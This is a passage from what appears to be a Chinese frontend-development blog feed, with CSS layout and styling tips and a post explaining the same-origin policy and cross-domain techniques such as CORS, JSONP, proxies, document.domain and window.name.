class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .app&#123; </span><br><span class="line">      display: flex</span><br><span class="line">    &#125;</span><br><span class="line">    .wrapper&#123; </span><br><span class="line">      display: flex; </span><br><span class="line">      flex-direction: column; </span><br><span class="line">      min-height: 100vh;</span><br><span class="line">      width: 100%;</span><br><span class="line">    &#125;</span><br><span class="line">    section&#123; </span><br><span class="line">      flex: 1 0 auto;</span><br><span class="line">    &#125;</span><br><span class="line">    header, footer&#123; </span><br><span class="line">      height: 60px;</span><br><span class="line">      background: blue;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">      &lt;header&gt;&lt;/header&gt;</span><br><span class="line">      &lt;section&gt;&lt;/section&gt;</span><br><span class="line">      &lt;footer&gt;&lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-设置Select下拉箭头"><a href="#6-设置Select下拉箭头" class="headerlink" title="6. 设置Select下拉箭头"></a>6. 设置Select下拉箭头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select &#123;</span><br><span class="line">  appearance:none;</span><br><span class="line">  -moz-appearance:none;</span><br><span class="line">  -webkit-appearance:none;</span><br><span class="line">  background: url(&quot;http://ourjs.github.io/static/2015/arrow.png&quot;) no-repeat scroll right center transparent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// IE</span><br><span class="line">select::-ms-expand &#123; display: none; &#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="7-lt-input-gt-checkbox-radio样式自定义"><a href="#7-lt-input-gt-checkbox-radio样式自定义" class="headerlink" title="7. &lt;input&gt; checkbox radio样式自定义"></a>7. <code>&lt;input&gt; checkbox radio</code>样式自定义</h4><ul><li><p>方法1 图片替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>方法2 </p></li></ul><h4 id="8-弹窗，遮罩后内容不滚动"><a href="#8-弹窗，遮罩后内容不滚动" class="headerlink" title="8. 弹窗，遮罩后内容不滚动"></a>8. 弹窗，遮罩后内容不滚动</h4><p>Bootstrap, Ant design方法, 弹窗出现时给body添加行内样式<code>{overflow: hidden}</code>， 弹窗消失时<code>{overflow: auto}</code></p><h4 id="9-阻止因出现滚动条导致页面抖动"><a href="#9-阻止因出现滚动条导致页面抖动" class="headerlink" title="9. 阻止因出现滚动条导致页面抖动"></a>9. 阻止因出现滚动条导致页面抖动</h4><p>信息流页面，如新浪微博，开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现。 <code>margin: 0 auto</code>主体元素自然会做偏移——跳动产生。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">html &#123;</span><br><span class="line">  overflow-x: hidden;</span><br><span class="line">  overflow-y: auto;</span><br><span class="line">&#125;</span><br><span class="line">body &#123;</span><br><span class="line">  width: 100vw;</span><br><span class="line">  overflow-x: hidden;</span><br><span class="line">  padding-left: calc(100vw - 100%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="10-flex保持内容不超出容器"><a href="#10-flex保持内容不超出容器" class="headerlink" title="10. flex保持内容不超出容器"></a>10. flex保持内容不超出容器</h4><p>在一个设置了<code>flex: 1</code>或<code>flex: 0 0 25%</code>的容器中，如果文字很长，这时候文字就会超出容器，而不是呆在设置好的动态剩余空间中。可以给<code>.content</code>添加<code>width:0</code>, .content就不会被自己的元素无限撑开。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aside"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.main</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.aside</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden; <span class="comment">/* 兼容firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="10-纹理背景"><a href="#10-纹理背景" class="headerlink" title="10. 纹理背景"></a>10. 纹理背景</h4><p><a href="https://leaverou.github.io/css3patterns/" target="_blank" rel="noopener">更多详情查看</a><br><style>.veins div{  width: 250px;  height: 250px;  display: inline-block;}.veins1{  background:  radial-gradient(black 15%, transparent 16%) 0 0,  radial-gradient(black 15%, transparent 16%) 8px 8px,  radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 0 1px,  radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 8px 9px;  background-color:#282828;  background-size:16px 16px;}.veins2{  background-color: #6d695c;  background-image:  repeating-linear-gradient(120deg, rgba(255,255,255,.1), rgba(255,255,255,.1) 1px, transparent 1px, transparent 60px),  repeating-linear-gradient(60deg, rgba(255,255,255,.1), rgba(255,255,255,.1) 1px, transparent 1px, transparent 60px),  linear-gradient(60deg, rgba(0,0,0,.1) 25%, transparent 25%, transparent 75%, rgba(0,0,0,.1) 75%, rgba(0,0,0,.1)),  linear-gradient(120deg, rgba(0,0,0,.1) 25%, transparent 25%, transparent 75%, rgba(0,0,0,.1) 75%, rgba(0,0,0,.1));  background-size: 70px 120px;}.veins3{  background-color:silver;  background-image:  radial-gradient(circle at 100% 150%, silver 24%, white 25%, white 28%, silver 29%, silver 36%, white 36%, white 40%, transparent 40%, transparent),  radial-gradient(circle at 0    150%, silver 24%, white 25%, white 28%, silver 29%, silver 36%, white 36%, white 40%, transparent 40%, transparent),  radial-gradient(circle at 50%  100%, white 10%, silver 11%, silver 23%, white 24%, white 30%, silver 31%, silver 43%, white 44%, white 50%, silver 51%, silver 63%, white 64%, white 71%, transparent 71%, transparent),  radial-gradient(circle at 100% 50%, white 5%, silver 6%, silver 15%, white 16%, white 20%, silver 21%, silver 30%, white 31%, white 35%, silver 36%, silver 45%, white 46%, white 49%, transparent 50%, transparent),  radial-gradient(circle at 0    50%, white 5%, silver 6%, silver 15%, white 16%, white 20%, silver 21%, silver 30%, white 31%, white 35%, silver 36%, silver 45%, white 46%, white 49%, transparent 50%, transparent);  background-size: 100px 50px;}.veins4{  background-color:#556;  background-image: linear-gradient(30deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(150deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(30deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(150deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(60deg, #99a 25%, transparent 25.5%, transparent 75%, #99a 75%, #99a),  linear-gradient(60deg, #99a 25%, transparent 25.5%, transparent 75%, #99a 75%, #99a);  background-size:80px 140px;  background-position: 0 0, 0 0, 40px 70px, 40px 70px, 0 0, 40px 70px;}.veins5{  background-color:#269;  background-image: linear-gradient(white 2px, transparent 2px),  linear-gradient(90deg, white 2px, transparent 2px),  linear-gradient(rgba(255,255,255,.3) 1px, transparent 1px),  linear-gradient(90deg, rgba(255,255,255,.3) 1px, transparent 1px);  background-size: 100px 100px, 100px 100px, 20px 20px, 20px 20px;  background-position:-2px -2px, -2px -2px, -1px -1px, -1px -1px;}.veins6{  background-color:#001;  background-image: radial-gradient(white 15%, transparent 16%),  radial-gradient(white 15%, transparent 16%);  background-size: 60px 60px;  background-position: 0 0, 30px 30px;}.veins7{  background-color: #fff;  background-image:  linear-gradient(90deg, transparent 79px, #abced4 79px, #abced4 81px, transparent 81px),  linear-gradient(#eee .1em, transparent .1em);  background-size: 100% 1.2em;}.veins8{  background-color:white;  background-image: linear-gradient(90deg, rgba(200,0,0,.5) 50%, transparent 50%),  linear-gradient(rgba(200,0,0,.5) 50%, transparent 50%);  background-size:50px 50px;}.veins9{  background-color: gray;  background-image: linear-gradient(90deg, transparent 50%, rgba(255,255,255,.5) 50%);  background-size: 50px 50px;}</style><div class="veins">  <div class="veins1"></div>  <div class="veins2"></div>  <div class="veins3"></div>  <div class="veins4"></div>  <div class="veins5"></div>  <div class="veins6"></div>  <div class="veins7"></div>  <div class="veins8"></div>  <div class="veins9"></div></div></p><p><br></p><h4 id="11-不定宽高元素水平垂直居中"><a href="#11-不定宽高元素水平垂直居中" class="headerlink" title="11. 不定宽高元素水平垂直居中"></a>11. 不定宽高元素水平垂直居中</h4><p><em>不适合的方案</em></p><ul><li>text-align和line-height</li><li>position:absolute, 50%, margin: -px</li></ul><p><em>正确的方法</em></p><ul><li><p>display:table和display:table-cell</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table-cell;</span><br><span class="line">  <span class="attribute">vertical-align</span>:middle;</span><br><span class="line">  <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>position:absolute, 50%, translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%, -50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>vw, vh和translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>:fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50vh</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50vw</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%, -50%); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>:before和display:inline-block</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.container</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="12-移动端1px问题"><a href="#12-移动端1px问题" class="headerlink" title="12. 移动端1px问题"></a>12. 移动端1px问题</h4><p>由于不同的手机有不同的像素密度导致的。如果移动显示屏的分辨率始终是普通屏幕的2倍，1px的边框在devicePixelRatio=2的移动显示屏下会显示成2px，所以在高清瓶下看着1px总是感觉变胖了。</p><ul><li><p>在ios8+中当devicePixelRatio=2的时候使用0.5px</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.border &#123; border: 1px solid #999 &#125;</span><br><span class="line">@media screen and (-webkit-min-device-pixel-ratio: <span class="number">2</span>) &#123;</span><br><span class="line">  .border &#123; border: 0.5px solid #999 &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media screen and (-webkit-min-device-pixel-ratio: <span class="number">3</span>) &#123;</span><br><span class="line">  .border &#123; border: 0.333333px solid #999 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>transform: scale(0.5)</p></li></ul><p><br></p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://leaverou.github.io/css3patterns/" target="_blank" rel="noopener">CSS3 Patterns Gallery 纹路背景</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-examples.html" target="_blank" rel="noopener">Flex 布局教程：实例篇</a></li><li><a href="https://www.jianshu.com/p/d2be62a507b8" target="_blank" rel="noopener">多行溢出</a></li><li>《图解CSS3·核心技术与案例实践》 大漠[著]</li><li><a href="https://blog.csdn.net/zh_rey/article/details/77531224" target="_blank" rel="noopener">阻止因出现滚动条导致页面抖动</a></li><li><a href="https://www.jianshu.com/p/69c570f4c1cb" target="_blank" rel="noopener">能够让不定宽高元素水平和垂直居中的方法</a></li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS变量实现主题换肤</title>
      <link href="/2018/11/06/CSS%E5%8F%98%E9%87%8F%E6%8D%A2%E8%82%A4/"/>
      <url>/2018/11/06/CSS%E5%8F%98%E9%87%8F%E6%8D%A2%E8%82%A4/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>跨域请求</title>
      <link href="/2018/11/06/JS%E8%B7%A8%E5%9F%9F/"/>
      <url>/2018/11/06/JS%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<h3 id="1-同源策略"><a href="#1-同源策略" class="headerlink" title="1. 同源策略"></a>1. 同源策略</h3><p>为什么会出现跨域？因为存在同源策略。</p><blockquote><p>同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。（同源: 如果两个页面的协议，端口和域名都相同，则两个页面具有相同的源。）</p></blockquote><p><br></p><h4 id="1-1-受同源策略约束的交互"><a href="#1-1-受同源策略约束的交互" class="headerlink" title="1.1 受同源策略约束的交互"></a>1.1 受同源策略约束的交互</h4><ul><li><em>dom同源策略</em><br>禁止对不同源页面DOM进行操作。这里主要场景是iframe跨域的情况，不同域名的iframe是限制互相访问的。</li><li><em>XmlHttpRequest同源策略</em><br>禁止使用XHR对象向不同源的服务器地址发起HTTP请求。<br><br></li></ul><h4 id="1-2-可执行的跨源访问"><a href="#1-2-可执行的跨源访问" class="headerlink" title="1.2 可执行的跨源访问"></a>1.2 可执行的跨源访问</h4><ul><li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本 </li><li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS</li><li><code>&lt;img&gt;</code>嵌入图片</li><li><code>&lt;video&gt; 和 &lt;audio&gt;</code> 嵌入多媒体资源。</li><li><code>&lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;</code>的插件</li><li><code>@font-face</code> 引入的字体</li><li><code>&lt;frame&gt; 和 &lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li><li><code>CORS</code>跨域资源共享机制，允许跨域访问</li></ul><p><br></p><h3 id="2-跨域解决方案"><a href="#2-跨域解决方案" class="headerlink" title="2. 跨域解决方案"></a>2. 跨域解决方案</h3><h4 id="2-1-CORS"><a href="#2-1-CORS" class="headerlink" title="2.1 CORS"></a>2.1 CORS</h4><p>CORS 跨域资源共享，它允许浏览器向跨域服务器，发出XMLHttpRequest请求，从而克服ajax只能同源使用的限制。</p><p>整个CORS通信过程，由浏览器自动完成，对开发者来说，CORS通信与ajax没有差别。浏览器一旦发现ajax请求跨源，会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。浏览器将CORS请求分成两类：简单请求和非简单请求。</p><p><br></p><h5 id="2-1-1-触发预请求"><a href="#2-1-1-触发预请求" class="headerlink" title="2.1.1 触发预请求"></a>2.1.1 触发预请求</h5><p>当请求满足下述任一条件时，即会触发预检请求：</p><ul><li><p>使用了下面任一HTTP方法：</p><ul><li>PUT</li><li>DELETE</li><li>CONNECT</li><li>OPTIONS</li><li>TRACE</li><li>PATCH</li></ul></li><li><p>人为设置了下面字段以外的其他首部字段：</p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Content-Type</li><li>DPR</li><li>Downlink</li><li>Save-Data</li><li>Viewport-Width</li><li>Width</li></ul></li><li><p><code>Content-Type</code>的值不属于下列之一</p><ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li><li>text/plain</li></ul></li><li><p>请求中的<code>XMLHttpRequestUpload</code>对象注册了任一多个事件监听器</p></li><li>请求中使用<code>ReadableStream</code>对象</li></ul><p><br><br><em>Q: 有一个需求复杂的老项目，每个请求都会触发预请求。怎样消除预请求，减少请求数？</em></p><p><br></p><h5 id="2-2-2-简单请求"><a href="#2-2-2-简单请求" class="headerlink" title="2.2.2 简单请求"></a>2.2.2 简单请求</h5><p>对于简单请求，浏览器直接发出CORS请求，并在头信息中，增加<code>Origin</code>字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Host: api.alice.com</span><br></pre></td></tr></table></figure></p><p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应，回应头信息中没有<code>Access-Control-Allow-Origin</code>字段，就知道错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。</p><p>如果<code>Origin</code>指定的源在许可范围内，服务器返回的响应，会多出几个头信息字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com  // 接受哪些域名的请求</span><br><span class="line">Access-Control-Allow-Credentials: true           // 是否允许发送cookie</span><br><span class="line">Access-Control-Expose-Headers: FooBar            // 可选</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="2-2-3-非简单请求"><a href="#2-2-3-非简单请求" class="headerlink" title="2.2.3 非简单请求"></a>2.2.3 非简单请求</h5><p>非简单请求，会在正式通信之前，增加一次HTTP查询请求，称为“预检”（preflight）。<br><em>预检请求</em>用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 预检请求的头信息</span><br><span class="line">OPTIONS /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line"></span><br><span class="line">// 指定浏览器CORS请求会额外发送的头信息字段</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header </span><br><span class="line">Host: api.alice.com</span><br></pre></td></tr></table></figure></p><p>服务器收到“预检”请求号，检查了<code>Origin, Access-Control-Request-Method 和 Access-Control-Request-Headers</code>字段后，确定允许跨域请求，做出回应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OKs</span><br><span class="line">// 服务器回应的CORS相关字段</span><br><span class="line">Access-Control-Allow-Origin: http://api.bob.coms</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure></p><p>如果服务器否定了“预检”请求，会返回一个正常的HTTP回应，但没有任何CORS相关的头信息字段。浏览器会认定服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。</p><p><br></p><h5 id="2-2-4-withCredentials"><a href="#2-2-4-withCredentials" class="headerlink" title="2.2.4 withCredentials"></a>2.2.4 withCredentials</h5><p>CORS请求默认不发送Cookie和HTTP认证信息。如果要把cookie发到服务器，服务器需要指定<code>Access-Control-Allow-Credentials</code>字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></p><p>开发者必须在ajax请求中打开<code>withCredentials</code>属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = true;</span><br></pre></td></tr></table></figure></p><p>注意，如果要发送Cookie，<code>Access-Control-Allow-Origin</code>不能设为星号，必须指定明确的，与请求网页一致的域名。同时，Cookie仍遵循同源政策，跨源(原网页代码中)的<code>document.cookie</code>无法读取服务器域名下的Cookie。</p><p><br></p><h4 id="2-2-JSONP"><a href="#2-2-JSONP" class="headerlink" title="2.2 JSONP"></a>2.2 JSONP</h4><p>动态增加来一个script标签，请求来自服务器的一段js并执行。（只能get请求）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    // script加载完成后执行该代码</span><br><span class="line">    var functionHandler = function(data)&#123;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;</span><br><span class="line">    // 请求中可以增加参数</span><br><span class="line">    var url = &apos;http://xxx.com/xxxx?prams=xxx&amp;callback=functionHandler&apos;;</span><br><span class="line">    var script = document.createElement(&apos;script&apos;);</span><br><span class="line">    script.setAttribute(&apos;src&apos;, url);</span><br><span class="line">    document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>服务器返回的script文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">functionHandler(data)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-服务器代理"><a href="#2-3-服务器代理" class="headerlink" title="2.3 服务器代理"></a>2.3 服务器代理</h4><p>在服务器端配置好代理，浏览器端就不会出现跨域的问题<br>在开发阶段比较常实现<br>devsever的proxy就是用来该原理<br>在devsever中配置代理，原指向devserver的请求被代理到目标地址，在服务器中http请求没有跨域限制，所以解决了浏览器js跨域的问题</p><p><br></p><h4 id="2-4-document-domain"><a href="#2-4-document-domain" class="headerlink" title="2.4 document.domain"></a>2.4 document.domain</h4><p>修改<code>document.domain</code>实现子域不同的页面进行跨域交互。<code>document.domain</code>存放的是载入文档的服务器的主机名，可以手动设置这个属性，但只能设置成当前域名或上级域名，如id.qq.com, qq.com。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = 顶级域名</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-5-window-name"><a href="#2-5-window-name" class="headerlink" title="2.5 window.name"></a>2.5 window.name</h4><p><code>window.name</code>利用同一窗体下加载不同的页面，window.name的值不会清除，达到传递数据的效果。（数据大小支持到2MB）。具体操作需要3个页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a 域名下的 origin page</span><br><span class="line">a 域名下的 proxy page</span><br><span class="line">b 域名下的 data page</span><br></pre></td></tr></table></figure></p><p>a 域名下origin page 通过动态的iframe 加载 data page, data page中设置了window.name = data数据。</p><p>可是此时 origin page的域名与data page域名不一致，浏览器限制交互，所以需要将iframe跳转到proxy page（即iframe的scr值设置为proxy page）。此时iframe与 origin page同源，可以操作获取到iframe 的window.name中的数据，获取完毕后销毁iframe。</p><p>这样origin page就可以获取到非同源下的 data page数据。</p><p>a域名下的 origin page<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var a=document.getElementsByTagName(&quot;button&quot;)[0];</span><br><span class="line">    a.onclick=function()&#123;                               </span><br><span class="line">        var inf=document.createElement(&quot;iframe&quot;);       //创建iframe</span><br><span class="line">        inf.src=&quot;http://www.b.com/data.html&quot;+&quot;?h=5&quot;     //加载数据页www.b.com/data.html?h=5</span><br><span class="line">        var body=document.getElementsByTagName(&quot;body&quot;)[0];</span><br><span class="line">        body.appendChild(inf);                          //引入a页面</span><br><span class="line"></span><br><span class="line">        inf.onload=function()&#123;</span><br><span class="line">            inf.src=&apos;http://www.a.com/proxy.html&apos;       //iframe加载完成，加载www.a.com域下边的空白页proxy.html</span><br><span class="line">            console.log(inf.contentWindow.name)        //输出window.name中的数据</span><br><span class="line">            body.removeChild(inf)                      //清除iframe</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>b域名下 data page<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span 